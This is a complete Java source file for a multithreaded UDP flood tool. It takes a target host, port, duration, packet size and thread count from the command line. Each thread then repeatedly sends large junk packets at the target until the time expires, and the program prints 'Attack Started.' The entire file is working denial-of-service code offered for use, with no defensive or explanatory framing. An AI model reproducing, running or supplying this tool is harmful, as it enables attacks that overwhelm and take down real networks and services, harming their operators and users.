package me.duck.udp;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;

public class Main {

    private static Runnable attack(String host, int port, long endTime, long bytes){
        return new Runnable() {
            @Override
            public void run() {
                try {
                    final byte[] buffer = new byte[(int)bytes];
                    final DatagramSocket socket = new DatagramSocket();
                    final DatagramPacket packet = new DatagramPacket(buffer, buffer.length, new InetSocketAddress(host, port));

                    while(System.currentTimeMillis() < endTime){
                        socket.send(packet);
                        socket.send(packet);
                        socket.send(packet);
                        Thread.sleep(20);

                    }

                }catch (Exception e){
                    System.out.println(e);
                }

            }
        };
    }

    public static void main(String[] args) {

        // args: host port length bytes threads

        if (args.length != 5){
            System.out.println("Correct Arguments: java -jar method.jar host port length bytes threads");
            return;
        }

        int threads = Integer.parseInt(args[4]);

        for (int x = 0; x < threads; x++){
            final long endTime = System.currentTimeMillis() + (Integer.parseInt(args[2]) * 1000);
            new Thread(attack(args[0], Integer.parseInt(args[1]), endTime, Long.parseLong(args[3]))).start();

        }
        System.out.println("Created Threads..");
        System.out.println("\nAttack Started.");
    }

}
